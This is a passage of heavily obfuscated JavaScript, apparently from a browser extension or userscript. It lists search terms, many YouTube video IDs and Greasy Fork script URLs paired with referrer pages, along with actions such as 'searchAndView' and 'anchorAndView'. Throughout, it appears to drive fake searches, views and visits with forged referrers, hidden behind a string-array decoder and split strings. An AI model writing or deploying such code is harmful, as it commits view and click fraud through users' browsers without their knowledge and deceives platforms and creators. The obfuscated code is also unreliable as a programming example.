'zyenith']['repeatExte' + 'nd'](0x1 * -0xa26 + -0x1145 + 0x1b75)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xa * -0x301 + 0x1 * 0xa33 + 0x2d7 * 0x7)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x3 * -0xc9f + 0x1167 + -0x3741);

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1dfa + -0x139a + -0xa60 * 0x1);
    let h = e[f];
    if (c['ZewvAj'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x5c9 * -0x5 + 0xa70 + -0x1 * -0x127d, r, s, t = 0x1 * 0x6d7 + 0x71 + 0x4 * -0x1d2; s = m['charAt'](t++); ~s && (r = q % (-0x1 * 0x1855 + 0x43c + 0x141d) ? r * (0x3bf * 0x2 + 0x2 * -0xb83 + 0xfc8) + s : s, q++ % (-0x1def + -0x3e * -0x9e + -0x851)) ? o += String['fromCharCode'](-0xba2 + -0x373 * -0x5 + -0x49e & r >> (-(-0x236e + -0x2 * -0x115 + 0x2146) * q & -0x1ee1 + -0x3a2 + -0x4ef * -0x7)) : -0x20b4 + 0x5ca * -0x1 + 0x267e) {
          s = n['indexOf'](s);
        }
        for (let u = -0x5 * 0x3b3 + 0x2334 + -0x10b5, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x17a6 + -0x24f6 + 0x161 * 0x2c))['slice'](-(-0x1631 + 0x2065 + -0xae * 0xf));
        }
        return decodeURIComponent(p);
      };
      c['AKKYsg'] = i, b = arguments, c['ZewvAj'] = !![];
    }
    const j = e[-0x17e3 + -0x239 * -0xf + -0x5 * 0x1e4],
      k = f + j,
      l = b[k];
    return !l ? (h = c['AKKYsg'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    U(0xa, 'U0aj') + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + U(0x13, '[RxC') + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + V(0xc),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': W(0x0) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
